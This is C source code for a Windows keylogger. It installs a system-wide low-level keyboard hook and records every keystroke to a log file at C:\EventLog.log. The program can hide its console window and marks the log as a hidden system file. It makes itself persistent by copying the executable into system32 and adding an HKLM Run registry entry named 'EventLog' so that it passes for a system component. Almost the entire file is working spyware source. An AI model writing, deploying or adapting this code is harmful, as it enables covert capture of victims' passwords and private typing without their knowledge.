#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include<string.h>

// function to check caps lock
int isCapsLock()
{
     if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0)
        return 1;
     else
        return 0;    
}


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    /* This structure contains information about a low-level keyboard input like virtual code, scan code, flags,
       time stamp and additional information associated with the message.
    */
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
    FILE *file;
    char val[5];
    DWORD dwMsg = 1;
    file=fopen("C:\\EventLog.log","a+");
    switch (wParam)
    {
           
        case WM_KEYDOWN: // When the key has been pressed. Changed from WM_KEYUP to catch multiple strokes.
        {
            // Assign virtual key code to local variable
            DWORD vkCode = pKeyBoard->vkCode;
    
            if ((vkCode>=39)&&(vkCode<=64)) // Keys 0-9
            {

                if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
                {
                    switch (vkCode) // 0x30-0x39 is 0-9 respectively
                    {
                    case 0x30:
                        fputs(")",file);
                        break;
                    case 0x31:
                        fputs("!",file);
                        break;
                    case 0x32:
                        fputs("@",file); 
                        break;
                    case 0x33:
                        fputs("#",file);  
                        break;
                    case 0x34:
                        fputs("$",file);   
                        break;
                    case 0x35:
                        fputs("%",file);  
                        break;
                    case 0x36:
                        fputs("^",file);  
                        break;
                    case 0x37:
                        fputs("&",file);  
                        break;
                    case 0x38:
                        fputs("*",file);  
                        break;
                    case 0x39:
                        fputs("(",file);  
                        break;
                    }
                }
                else // If shift key is not down
                {
                   sprintf(val,"%c",vkCode);
                   fputs(val,file);  
                }
            }
            else if ((vkCode>64)&&(vkCode<91)) // Keys a-z
            {
                /*
                The following is a complicated statement to check if the letters need to be switched to lowercase.
                Here is an explanation of why the exclusive or (XOR) must be used.
                
                Shift   Caps    LowerCase    UpperCase
                T       T       T            F
                T       F       F            T
                F       T       F            T
                F       F       T            F
                
                The above truth table shows what case letters are typed in,
                based on the state of the shift and caps lock key combinations.
                
                The UpperCase column is the same result as a logical XOR.
                However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
                Becuase, NOT(XOR) would give us the LowerCase column results.
                
                There's your lesson in logic if you didn't understand the next statement. Hopefully that helped.
                
                --Dan
                */
                if (!(GetAsyncKeyState(VK_SHIFT)^isCapsLock())) // Check if letters should be lowercase
                {
                    vkCode+=32; // Un-capitalize letters
                }
                sprintf(val,"%c",vkCode);
                fputs(val,file);  
            }
            else
            {
                switch (vkCode) // Check for other keys
                {
                    case VK_SPACE:
                        fputs(" ",file);
                        break;
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                        fputs("[Ctrl]",file);
                        break;
                    case VK_LMENU:
                    case VK_RMENU:
                        fputs("[Alt]",file);
                        break;
                    case VK_INSERT:
                        fputs("[Insert]",file);
                        break;
                    case VK_DELETE:
                        fputs("[Del]",file);
                        break;
                    case VK_NUMPAD0:
                        fputs("0",file);
                        break;
                    case VK_NUMPAD1:
                        fputs("1",file);
                        break;
                    case VK_NUMPAD2:
                        fputs("2",file);
                        break;
                    case VK_NUMPAD3:
                        fputs("3",file);
                        break;
                    case VK_NUMPAD4:
                        fputs("4",file);
                        break;
                    case VK_NUMPAD5:
                        fputs("5",file);
                        break;
                    case VK_NUMPAD6:
                        fputs("6",file);
                        break;
                    case VK_NUMPAD7:
                        fputs("7",file);
                        break;
                    case VK_NUMPAD8:
                        fputs("8",file);
                        break;
                    case VK_NUMPAD9:
                        fputs("9",file);
                        break;
                    case VK_OEM_2:
                        if (GetAsyncKeyState(VK_SHIFT))
                             fputs("?",file);
                        else
                             fputs("/",file);
                        break;
                    case VK_OEM_3:
                        if (GetAsyncKeyState(VK_SHIFT))
                             fputs("~",file);
                        else
                             fputs("`",file);
                        break;
                    case VK_OEM_4:
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("{",file);
                         else
                            fputs("[",file);
                         break;
                    case VK_OEM_5:
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("|",file);
                         else
                            fputs("\\",file);
                         break;
                    case VK_OEM_6:
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("}",file);
                         else
                            fputs("]",file);
                         break;
                    case VK_OEM_7:
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("\\",file);
                         else
                            fputs("'",file);
                         break;
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        // do nothing;
                        break;
                    case 0xBC:                //comma       
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("<",file);
                         else
                            fputs(",",file);
                         break;
                    case 0xBE:              //Period
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs(">",file);
                         else
                            fputs(".",file);
                         break;
                    case 0xBA:              //Semi Colon same as VK_OEM_1
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs(":",file);
                         else
                            fputs(";",file);
                         break;
                    case 0xBD:              //Minus
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("_",file);
                         else
                            fputs("-",file);
                         break;
                    case 0xBB:              //Equal
                         if(GetAsyncKeyState(VK_SHIFT))
                            fputs("+",file);
                         else
                            fputs("=",file);
                         break;
                    default: 
                             
                        /* For More details refer this link http://msdn.microsoft.com/en-us/library/ms646267            
                           As mentioned in document of GetKeyNameText http://msdn.microsoft.com/en-us/library/ms646300
                		   Scon code is present in 16..23 bits therefor I shifted the code to correct position
                           Same for Extended key flag 		
                		*/
                        dwMsg += pKeyBoard->scanCode << 16;
                        dwMsg += pKeyBoard->flags << 24;
        
                        char key[16];
                        /* Retrieves a string that represents the name of a key. 
                		   1st Parameter dwMsg contains the scan code and Extended flag
                		   2nd Parameter lpString: lpszName - The buffer that will receive the key name. 
                           3rd Parameter cchSize: The maximum length, in characters, of the key name, including the terminating null character
                           If the function succeeds, a null-terminated string is copied into the specified buffer,
                           and the return value is the length of the string, in characters, not counting the terminating null character.
                           If the function fails, the return value is zero.  
                	    */
                        GetKeyNameText(dwMsg,key,15);
                        fputs(key,file);            
                }
            }
        }
        default:
                      
            fclose(file);
            /* Passes the hook information to the next hook procedure in the current hook chain.
                 1st Parameter hhk - Optional
                 2nd Parameter nCode - The next hook procedure uses this code to determine how to process the hook information.
                 3rd Parameter wParam - The wParam value passed to the current hook procedure.
                 4th Parameter lParam - The lParam value passed to the current hook procedure
            */
            return CallNextHookEx( NULL, nCode, wParam, lParam );
    }
     fclose(file);
    return 0;    
}
   
// Function called by main function to install hook
DWORD WINAPI KeyLogger(LPVOID lpParameter)
{

    HHOOK hKeyHook;  
    /* Retrieves a module handle for the specified module. 
	   parameter is NULL, GetModuleHandle returns a handle to the file used to create the calling process (.exe file).
	   If the function succeeds, the return value is a handle to the specified module.
       If the function fails, the return value is NULL. 
    */
    HINSTANCE hExe = GetModuleHandle(NULL);
    
    if(hExe == NULL)
    {
       return 1;           
    }
    else
    {
        /*Installs an application-defined hook procedure into a hook chain
          1st Parameter idHook: WH_KEYBOARD_LL - The type of hook procedure to be installed
          Installs a hook procedure that monitors low-level keyboard input events. 
          2nd Parameter lpfn: LowLevelKeyboardProc - A pointer to the hook procedure.
          3rd Parameter hMod: hExe - A handle to the DLL containing the hook procedure pointed to by the lpfn parameter.
          4th Parameter dwThreadId: 0 - the hook procedure is associated with all existing threads running
          If the function succeeds, the return value is the handle to the hook procedure.
          If the function fails, the return value is NULL.
        */
         hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)LowLevelKeyboardProc, hExe, 0);
         /*Defines a system-wide hot key of alt+ctrl+9
           1st Parameter hWnd(optional) :NULL - A handle to the window that will receive hot key message generated by hot key.
           2nd Parameter id:1 - The identifier of the hot key
           3rd Parameter fsModifiers: MOD_ALT | MOD_CONTROL -  The keys that must be pressed in combination with the key
           specified by the uVirtKey parameter in order to generate the WM_HOTKEY message. 
           4th Parameter vk: 0x39(9) - The virtual-key code of the hot key
         */
         RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);
         
         MSG msg; 
         // Message loop retrieves messages from the thread's message queue and dispatches them to the appropriate window procedures. 
         // For more info http://msdn.microsoft.com/en-us/library/ms644928%28v=VS.85%29.aspx#creating_loop
         //Retrieves a message from the calling thread's message queue.
         while (GetMessage(&msg, NULL, 0, 0) != 0)
         {
               // if Hot key combination is pressed then exit
               if (msg.message == WM_HOTKEY)
               {
                  UnhookWindowsHookEx(hKeyHook);                
                  return 0;
               }
               //Translates virtual-key messages into character messages. 
               TranslateMessage(&msg);
               //Dispatches a message to a window procedure.
               DispatchMessage(&msg);       
         }

         /* To free system resources associated with the hook and removes a hook procedure installed in a hook chain
           Parameter hhk: hKeyHook - A handle to the hook to be removed. 
         */
	     UnhookWindowsHookEx(hKeyHook);
    }       
    return 0;
}

int StartKeyLogging(char* argv[])
{
    HANDLE hThread;
	DWORD dwThread;
    
    /* CreateThread function Creates a thread to execute within the virtual address space of the calling process.
       1st Parameter lpThreadAttributes:  NULL - Thread gets a default security descriptor.
       2nd Parameter dwStackSize:  0  - The new thread uses the default size for the executable.
       3rd Parameter lpStartAddress:  KeyLogger - A pointer to the application-defined function to be executed by the thread
       4th Parameter lpParameter:  argv[0] -  A pointer to a variable to be passed to the thread
       5th Parameter dwCreationFlags: 0 - The thread runs immediately after creation.
       6th Parameter pThreadId(out parameter): NULL - the thread identifier is not returned
       If the function succeeds, the return value is a handle to the new thread.
    */
    hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)KeyLogger, (LPVOID) argv[0], 0, NULL); 
    
    if (hThread)
    {
       //Waits until the specified object is in the signaled state or the time-out interval elapses.         
       return WaitForSingleObject(hThread,INFINITE);
    }
    // if it is Null then exit the main function
    else
    {
	   return 1;
     }
}


// If visble = 0 then Keylogger is hidden oe visible =1 then keylogger is visible
const int VISIBLE = 1;

// Function to hide the window of keylogger
void ToHide()
{
     HWND stealth;
     
     /* Retrieves a handle to the top-level window whose class name and window name match the specified strings.
        1st Parmeter lpClassName: ConsoleWindowClass - Class Name
        2nd Parameter lpWindowName: parameter is NULL, all window names match. 
        If the function succeeds, the return value is a handle to the window that has the specified class name and window name.
        If the function fails, the return value is NULL.   
     */
     stealth=FindWindow("ConsoleWindowClass",NULL);
     ShowWindow(stealth,0);
}

/*
Its add registry entry to start the keylogger automatic every time computer boot
*/
void AutoStart()
{
     FILE *file;
     file = fopen("C:\\EventLog.log","r");
     //If file is not present then keylogger is run first time
     if(file==NULL)
     {
         file=fopen("C:\\EventLog.log","a+");
         //Change the atribute of file to hidden and system type file
         system("attrib +h +s C:\\EventLog.log");
         fclose(file); 
         // Add the registry entry 
         system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v EventLog /d %windir%\\system32\\KeyLogger.exe /f");
         // Copy the exe to system32 directory
         system("copy /Y KeyLogger.exe %windir%\\system32");
     }     
}
int main(int argc, char* argv[])
{
    
    if(VISIBLE == 0)
        ToHide();         
    AutoStart();     
    StartKeyLogging(argv);
             
}
